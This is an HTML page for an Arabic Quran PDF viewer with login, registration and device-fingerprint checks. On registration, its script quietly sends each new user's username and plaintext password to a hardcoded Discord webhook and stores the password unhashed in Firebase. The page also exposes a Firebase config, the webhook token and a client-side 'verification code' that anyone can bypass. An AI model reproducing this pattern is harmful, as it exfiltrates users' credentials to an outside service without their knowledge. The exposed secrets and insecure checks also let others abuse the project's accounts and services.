<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>المصحف الشريف - حماية الأجهزة الصارمة</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.16.105/pdf.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>

    <style>
        :root { --gold: #c5a059; --bg: #1a1a1a; }
        body, html { margin: 0; padding: 0; background: var(--bg); overflow-x: hidden; user-select: none; font-family: sans-serif; color: white; }
        #login-screen { height: 100vh; display: flex; align-items: center; justify-content: center; background: #000; position: relative; }
        .card { position: relative; background: #222; padding: 25px; border-radius: 15px; border: 1px solid var(--gold); width: 350px; text-align: center; box-shadow: 0 0 25px rgba(197, 160, 89, 0.2); }
        .tabs { display: flex; justify-content: space-around; margin-bottom: 20px; }
        .tab { padding: 10px; cursor: pointer; color: #888; width: 50%; border-bottom: 1px solid #444; }
        .tab.active { color: var(--gold); border-bottom: 2px solid var(--gold); font-weight: bold; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 5px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; text-align: center; outline: none; }
        button { width: 100%; padding: 14px; background: var(--gold); border: none; font-weight: bold; cursor: pointer; border-radius: 5px; color: #1a1a1a; margin-top: 10px; }
        #viewer-container { display: none; background: #222; min-height: 100vh; }
        #pdf-render-area { display: flex; flex-direction: column; align-items: center; padding: 20px 0; }
        canvas { margin-bottom: 25px; box-shadow: 0 0 30px rgba(0,0,0,0.7); max-width: 95%; }
        #loading-text { color: var(--gold); font-size: 14px; display: none; margin-top: 10px; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="login-screen">
        <div class="card">
            <div class="tabs">
                <div id="tab-login" class="tab active" onclick="switchTab('login')">دخول</div>
                <div id="tab-register" class="tab" onclick="switchTab('register')">إنشاء حساب</div>
            </div>
            <div id="form-container">
                <h3 id="form-title" style="color: var(--gold);">تسجيل دخول</h3>
                <input type="text" id="user" placeholder="اسم المستخدم">
                <input type="password" id="pass" placeholder="كلمة المرور">
                <input type="text" id="code" placeholder="كود التحقق">
                <button id="main-btn" onclick="handleAuth()">دخول</button>
                <div id="loading-text">جاري التحقق من بصمة الجهاز...</div>
            </div>
        </div>
    </div>

    <div id="viewer-container"><div id="pdf-render-area"></div></div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBJwkbfdBb2Yp1igq6SnhCivKWg54m-cOw",
            authDomain: "pdf1-85845.firebaseapp.com",
            databaseURL: "https://pdf1-85845-default-rtdb.firebaseio.com",
            projectId: "pdf1-85845",
            storageBucket: "pdf1-85845.firebasestorage.app",
            messagingSenderId: "657876361622",
            appId: "1:657876361622:web:8c9eb09e1d2da1d0193db7"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1481923628181360692/Ov75tKbrtRC6He0UnEFHHDiRhIDNfF6eSp5hRv0mTpCE8hkhH833LyThxddbNtmFlA2R";
        
        let currentMode = 'login';

        // دالة بصمة الجهاز "الصارمة"
        function getStrictToken() {
            const data = [
                navigator.userAgent,
                navigator.language,
                screen.width + "x" + screen.height,
                screen.colorDepth,
                new Date().getTimezoneOffset()
            ].join('|');
            return btoa(data);
        }

        function switchTab(mode) {
            currentMode = mode;
            document.getElementById('tab-login').classList.toggle('active', mode === 'login');
            document.getElementById('tab-register').classList.toggle('active', mode === 'register');
            document.getElementById('form-title').innerText = mode === 'login' ? 'تسجيل دخول' : 'إنشاء حساب جديد';
            document.getElementById('main-btn').innerText = mode === 'login' ? 'دخول' : 'تسجيل وإرسال للواتساب';
            document.getElementById('code').style.display = mode === 'login' ? 'block' : 'none';
        }

        async function handleAuth() {
            const u = document.getElementById('user').value.trim().toLowerCase();
            const p = document.getElementById('pass').value;
            const c = document.getElementById('code').value.trim();
            const loading = document.getElementById('loading-text');

            if(!u || !p) return alert("يرجى إكمال البيانات");
            loading.style.display = 'block';

            if (currentMode === 'register') {
                await database.ref('users/' + u).set({ password: p });
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ content: `🆕 حساب جديد محفوظ:\n👤 يوزر: ${u}\n🔑 باسورد: ${p}` })
                });
                alert("تم الحفظ! توجه للواتساب لتفعيل حسابك.");
                window.location.href = `https://wa.me/201277742850?text=أريد تفعيل كود الحساب: ${u}`;
                loading.style.display = 'none';
            } else {
                // فحص الدخول
                database.ref('users/' + u).once('value').then((snap) => {
                    const data = snap.val();
                    if(!data) {
                        alert("اليوزر غير مسجل.");
                        loading.style.display = 'none';
                    } else if (data.password !== p) {
                        alert("الباسورد خطأ! ❌");
                        loading.style.display = 'none';
                    } else if (c !== "2534gfsw26ft2r72t75e2e7#_") {
                        alert("كود التحقق خطأ.");
                        loading.style.display = 'none';
                    } else {
                        const myToken = getStrictToken();
                        // التحقق من الجلسة في الـ Firebase
                        database.ref('sessions/' + u).once('value').then((sessSnap) => {
                            const activeToken = sessSnap.val();

                            if (!activeToken) {
                                // أول مرة يسجل بصمة
                                database.ref('sessions/' + u).set(myToken).then(() => loadSecurePDF());
                            } else if (activeToken === myToken) {
                                // نفس الجهاز
                                loadSecurePDF();
                            } else {
                                // جهاز مختلف
                                alert("🚨 الحساب مسجل على جهاز آخر بالفعل! لا يمكن الدخول.");
                                loading.style.display = 'none';
                            }
                        });
                    }
                });
            }
        }

        async function loadSecurePDF() {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('viewer-container').style.display = 'block';
            const pdf = await pdfjsLib.getDocument('https://raw.githubusercontent.com/stmfreverstm-design/Pdf/main/123.pdf').promise;
            const area = document.getElementById('pdf-render-area');
            for (let i = 1; i <= pdf.numPages; i++) {
                const page = await pdf.getPage(i);
                const canv = document.createElement('canvas');
                const view = page.getViewport({ scale: 1.5 });
                canv.height = view.height; canv.width = view.width;
                await page.render({ canvasContext: canv.getContext('2d'), viewport: view }).promise;
                area.appendChild(canv);
            }
        }
    </script>
</body>
</html>
